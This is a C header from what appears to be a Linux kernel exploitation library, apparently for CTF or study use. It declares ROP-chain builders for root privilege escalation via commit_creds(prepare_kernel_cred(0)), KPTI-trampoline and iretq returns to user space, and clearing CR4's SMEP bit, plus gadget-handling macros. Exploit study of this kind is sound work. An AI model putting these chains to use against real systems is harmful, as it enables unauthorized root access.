#ifndef ROP_H
#define ROP_H

#include <stdint.h>
#include <sys/types.h>
#include "ret2user.h"
#include "kpti_trampoline.h"

/* Typedef a struct for rop chain rop[]
 *      to avoid bug when copying 0 from the chain to buffer
 *
 * ALWAYS use a struct when overflowing a buffer with ROP!
 *      We concept the stuct as a 'buffer' for 'rop', 
 *      while the raw rop chain as 'chain' itself
 * */
typedef struct {
    uintptr_t *chain;
    size_t count;
} rop_buffer_t;


/* ============= Kcreds =============
 * Privesc with commit_creds(prepare_kernel_cred(0));
 *      to become root  
 * */
size_t chain_commit_creds(rop_buffer_t rop,
                        uintptr_t pop_rdi_ret,
                        uintptr_t prepare_kernel_cred,
                        rop_buffer_t mov_rdi_rax_chain,
                        uintptr_t commit_creds);


/* ============= KPTI Trampoline ============= */

/* 
 * KPTI trampoline (swapgs_restore_regs_and_return_to_usermode + 22)
 *          +
 * Fake trampoline stack:
 *      junk,
 *      junk,
 *      user_rip,
 *      user_cs,
 *      user_rflags,
 *      user_rsp,
 *      user_ss
 *
 * More details in "kpti_trampoline.h"
 */
size_t chain_kpti_trampoline(rop_buffer_t rop,
                            uintptr_t kpti_trampoline,
                            iretq_user_ctx_t ctx);


/* ============= iretq  =============
 * After privesc, return to user space with:
 *      swapgs ... iretq
 * 
 * Control RIP, CS, RFLAGS, RSP, SS registers on stack frame 
 * */
size_t chain_swapgs_iretq(rop_buffer_t rop,
                        uintptr_t swapgs_pop_rbp_ret,
                        uintptr_t iretq,
                        iretq_user_ctx_t ctx);


/* ============= CR4 Hijack =============
 * CR4 is a 64-bit control register, 
 *      whewre each bit enables or disables certain CPU features.
 *      
 * Bit 20 (1 << 20) controls SMEP - 1 for on, 0 for off.
 *
 * [!] But this is patched since Linux 5.1 in May 2019
 *      native_write_cr4() now ensures that once CR4 is set,
 *      those bits cannot be cleared via ROP or other direct writes
 *
 * This works only for Linux 4.* and older.
 * */ 

/* Chain up to zero out 20th bit of CR4 */
size_t chain_cr4_smep(rop_buffer_t rop, 
                    uintptr_t pop_rdi_ret,
                    uintptr_t cr4_val,
                    uintptr_t mov_cr4_rdi_ret,
                    uintptr_t ret_addr);


/* ============= ROP Helpers ==============*/

/* Push gadgets onto an ROP chain (rop_buffer_t) */
#define PUSH_ROP(dst, pos, gadget) do {                    \
    if ((pos) >= (dst).count)                              \
        DIE("PUSH_ROP: ROP overflows at %s:%d", __FILE__, __LINE__); \
    (dst).chain[(pos)++] = (gadget);                       \
} while (0)

/* Shrink ROP (rop_buffer_t) count after chaining up with its return size */
#define TRIM_ROP(rop, len) do { (rop).count = (len);  } while (0)

/*
 * concat_rop_list - concatenate multiple ROPs (rop_buffer_t) into one buffer
 *
 * @dst:       target ROP buffer to write into
 * @dst_off:   pointer to the current offset (will be updated)
 * @list:      array of ROP buffers to concatenate
 * @count:     number of ROP buffers in the list
 *
 * Appends all gadgets from the given list of ROP buffers into the destination buffer.
 * Uses PUSH_ROP to ensure bounds checking.
 *
 * Returns the new offset in the destination buffer.
 */
size_t concat_rop_list(rop_buffer_t dst,
                        size_t *dst_off,
                        const rop_buffer_t *list,
                        size_t count);

/* 
 * COUNT_ROP - compute the number of ROP entries
 *      (Should only be used on real arrays, not pointers)
 *
 * Example:
 *     uintptr_t chain[] = { gadget1, gadget2 };
 *     size_t count = COUNT_ROP(chain);  // yields 2
 */
#define COUNT_ROP(rop_chain_arr)                    \
    (sizeof(rop_chain_arr) / sizeof(uintptr_t))



#endif

